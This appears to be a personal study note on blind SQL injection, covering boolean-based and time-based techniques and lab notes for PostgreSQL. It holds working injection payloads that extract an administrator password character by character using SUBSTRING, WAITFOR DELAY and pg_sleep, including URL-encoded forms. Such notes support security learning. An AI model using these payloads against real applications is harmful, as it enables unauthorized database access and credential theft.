## What is blind SQL Injection?

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as [[UNION SQLi]] are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. 

It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

---
## Boolean-based Blind SQLi

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

```http
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. 

However, the application does behave differently depending on whether the query returns any data. If you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.

> [!example] Example 1. Blind SQL with Cookie TrackingId
> To understand how this exploit works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
> 
> ```sql
> …xyz' AND '1'='1 
> …xyz' AND '1'='2
> ```
> 
> - The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
> - The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
> 
> This allows us to determine the answer to any single injected condition, and extract data one piece at a time.

> [!example] Example 2. Blind SQL against Password in DB
> For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
> 
> To do this, start with the following input:
> 
> ```sql
> xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'
> ```
> 
> This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.
> 
> Next, we send the following input:
> 
> ```sql
> xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't'
> ```
> 
> This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.
> 
> Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:
> 
> ```sql
> xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'
> ```
> 
> We can continue this process to systematically determine the full password for the `Administrator` user.

> The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the SQL injection cheat sheet.

---
## Time-based Blind SQLi
If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors ([[Error-based SQLi]]) will not work.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.

The techniques for triggering a time delay are specific to the type of database being used. 

> [!example] MsSQL Server example for Time-based SQLi
> For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:
> 
> ```sql
> '; IF (1=2) WAITFOR DELAY '0:0:10'-- '; IF (1=1) WAITFOR DELAY '0:0:10'--
> ```
> 
> - The first of these inputs does not trigger a delay, because the condition `1=2` is false.
> - The second input triggers a delay of 10 seconds, because the condition `1=1` is true.

> [!example] MsSQL Server Get DB password using Time-based blind SQLi
> Using this technique, we can retrieve data by testing one character at a time:
> 
> ```sql
> '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
> ```

> [!info]
> There are various ways to trigger time delays within SQL queries, and different techniques apply on different types of database. For more details, see the SQL injection cheat sheet.

> [!attention] URL Encoding
> Make sure to url encode your SQLi

> [!important] Lab Time-based blind SQLi using PostgreSQL
> Basic Test for time based blind SQLi:
> ```sql
> '; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
> ```
> Web encoded version:
> ```sql
> '%3B+SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--
> ```
> 
> Check if user exists:
> ```sql
> '; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
> ```
> Web encoded version:
> ```sql
> '%3B+SELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
> ```
> 
> Test Password (Encoded version):
> ```sql
> '%3B+SELECT+CASE+WHEN+(SUBSTR(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--
> ```

#security/web/sql 
